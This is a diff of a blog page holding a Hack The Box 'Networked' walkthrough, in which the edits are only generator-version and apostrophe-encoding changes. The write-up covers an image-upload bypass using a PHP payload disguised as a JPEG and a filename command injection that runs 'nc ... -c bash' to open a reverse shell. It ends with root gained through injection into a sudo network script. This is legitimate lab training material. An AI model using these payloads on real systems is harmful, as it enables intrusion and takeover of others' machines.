@@ -55,7 +55,7 @@
     <link rel="icon" type="image/png" href="https://joegraham.co/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://joegraham.co/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.62.2" />
+    <meta name="generator" content="Hugo 0.67.0" />
   </head>
 
   <body class=" ">
@@ -124,7 +124,7 @@
         <p>Networked is a Linux box created by Guly that is rated fairly easily by the HTB community. Even though
 it was fairly easy, I got some good practice with command injection vulnerabilities and circumventing file verification methods.</p>
 <h1 id="enumeration">Enumeration</h1>
-<p>Let's start by taking a look at what services are running on the box using nmap.</p>
+<p>Let&rsquo;s start by taking a look at what services are running on the box using nmap.</p>
 <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-30 16:16 EDT
 Nmap scan report for 10.10.10.146
 Host is up (0.26s latency).
@@ -140,7 +140,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1875.57 seconds
 <p>The only usable listening service at our disposal is HTTP. Browsing to the index page of the site
 reveals this page:</p>
 <p><img src="https://joegraham.co/posts/networked/index_page.png" alt="index page, generic text with no links"></p>
-<p>Since there isn't really anything useful on this page, lets throw dirb at the site to see if we can
+<p>Since there isn&rsquo;t really anything useful on this page, lets throw dirb at the site to see if we can
 find any other pages.</p>
 <pre><code>root@kali:networked# dirb http://10.10.10.146 /usr/share/wordlists/dirb/big.txt
 -----------------
@@ -170,7 +170,7 @@ GENERATED WORDS: 20458
 END_TIME: Fri Aug 30 17:52:43 2019
 DOWNLOADED: 40916 - FOUND: 1
 </code></pre><p>We have two useful directories: backup and uploads. The uploads directory is not listable, and the index.html page has a single
-&ldquo;.&rdquo; as its content, so it's not useful to us right now. The backup directory is listable though, and contains a single
+&ldquo;.&rdquo; as its content, so it&rsquo;s not useful to us right now. The backup directory is listable though, and contains a single
 backup.tar file that we can download and extract.</p>
 <pre><code>root@kali:downloads# tar -xvf backup.tar
 index.php
@@ -186,7 +186,7 @@ The file extension remains the same.</p>
 <p><img src="https://joegraham.co/posts/networked/upload_page.png" alt="upload page"></p>
 <p>Looking at the source code gained from backup.tar, index.php and photos.php are basic pages that implement how they look without much additional logic.
 lib.php is a library file that is loaded by photos.php and upload.php and contains functions used to validate the IP address of the uploader,
-generate the filename used for each upload, and to verify that an uploaded file's extension matches its MIME data type.
+generate the filename used for each upload, and to verify that an uploaded file&rsquo;s extension matches its MIME data type.
 upload.php contains the code to process uploads as well as to display the upload form.</p>
 <p><img src="https://joegraham.co/posts/networked/upload_source.png" alt="upload.php source code"></p>
 <p>As we can see in the above code, the file is first checked using the check_file_type function loaded from lib.php to determine if the file
@@ -197,7 +197,7 @@ appears to be a programming error, since the use of the logical and would allow 
 this check. This may have been an avenue for exploitation, but I chose not to look into this much further.</p>
 <p><img src="https://joegraham.co/posts/networked/lib_file_check.png" alt="source for the file verification functions from lib.php"></p>
 <p>Looking more closely at the file verification code, we can see that either finfo_file or mime_content_type is called on the file to check
-to see if the file uploaded is actually an image. Experimenting with uploads, I found that it's possible to fool both of these function calls
+to see if the file uploaded is actually an image. Experimenting with uploads, I found that it&rsquo;s possible to fool both of these function calls
 by crafting a file that contains the file signature for a JPEG and has a .jpg extension on the end but contains PHP code within it.</p>
 <pre><code>root@kali:80# xxd payload.php.jpg
 00000000: ffd8 ffe0 0010 4a46 4946 0001 0a3c 3f70  ......JFIF...&lt;?p
@@ -218,12 +218,12 @@ shows that we have gained remote code execution as the apache user.</p>
 <p>The server conveniently has the nmap utility ncat installed, allowing us to get a shell on the box.</p>
 <h1 id="webserver-shell">Webserver shell</h1>
 <p>When I was working on this box, there were a lot of other users who would frequently request resets or cause trouble that made it difficult to work with
-at times. For that reason, I used Metasploit's multi/handler exploit with a generic/shell_reverse_tcp payload to handle shells, instead of just directly
+at times. For that reason, I used Metasploit&rsquo;s multi/handler exploit with a generic/shell_reverse_tcp payload to handle shells, instead of just directly
 using netcat. This made it slightly easier if I missed a reset notification or something broke to just run the payload and get another session instead
 of having to restart netcat.</p>
 <p>The reverse shell lacks a pty to start with, but Python is installed on the box, easily fixing this.
 <img src="https://joegraham.co/posts/networked/pty.png" alt="a connection is received by the Metasploit listener, user interacts with the session and runs &ldquo;python -c &lsquo;import pty;pty.spawn(&ldquo;bash&rdquo;)'&rdquo; to improve the shell"></p>
-<p>Doing some recon we find that the user for this box is named guly. guly's home directory contains three files: a PHP script called check_attack.php, a crontab,
+<p>Doing some recon we find that the user for this box is named guly. guly&rsquo;s home directory contains three files: a PHP script called check_attack.php, a crontab,
 and the user.txt flag file. The crontab shows that check_attack.php is called every three minutes. This is what check_attack.php contains:</p>
 <p><img src="https://joegraham.co/posts/networked/check_attack.png" alt="source code for check_attack.php"></p>
 <p>This is very promising. check_attack looks through each file in the uploads directory and checks to see if the filename is an IP address.
@@ -234,7 +234,7 @@ on the box as an actual user instead of the Apache service user.</p>
 <p><img src="https://joegraham.co/posts/networked/escalate_to_user.png" alt="a file with the name &ldquo;; nc 10.10.14.152 4445 -c bash&rdquo; is created in the uploads directory, and a session as guly is created when the cronjob runs"></p>
 <h1 id="user-shell">User shell</h1>
 <p>I did two things before beginning user post-exploitation. First, I deleted the injection file created in the last step. Getting a new user shell every three
-minutes is redundant and a waste of resources. Next, I copied an SSH public key into guly's home directory. The user shell has a pty allocated but still lacks
+minutes is redundant and a waste of resources. Next, I copied an SSH public key into guly&rsquo;s home directory. The user shell has a pty allocated but still lacks
 command history, which is annoying. Copying a public key allows us to SSH into the box as guly.</p>
 <p><img src="https://joegraham.co/posts/networked/ssh_key.png" alt="commands creating the .ssh directory and copying a public key onto the box through netcat"></p>
 <p>The first things I do after getting user access on a Linux box are to identify the distribution and kernel version information, using <code>cat /etc/*release*</code> and <code>uname -a</code>.
@@ -248,8 +248,8 @@ a password, which is very promising. Here are the contents of that file:</p>
 Running <code>sudo /usr/local/sbin/changename.sh</code> and injecting a <code>sudo su</code> as the interface name escalates privileges to root.</p>
 <p><img src="https://joegraham.co/posts/networked/escalate_to_root.png" alt="the sudo command is run, escalating privileges to root"></p>
 <h1 id="conclusion">Conclusion</h1>
-<p>I got stumped for longer than I'd like to admit on the privilege escalation, as I forgot that a user can see what sudo privileges they have using <code>sudo -l</code>
-if they can't read /etc/sudoers. I also enjoyed figuring out how to workaround the image verification, and did not know that you could inject commands
+<p>I got stumped for longer than I&rsquo;d like to admit on the privilege escalation, as I forgot that a user can see what sudo privileges they have using <code>sudo -l</code>
+if they can&rsquo;t read /etc/sudoers. I also enjoyed figuring out how to workaround the image verification, and did not know that you could inject commands
 into systemd network scripts. Overall, this was a fairly easy box that reinforces post-exploitation enumeration skills.</p>
 
       </div>
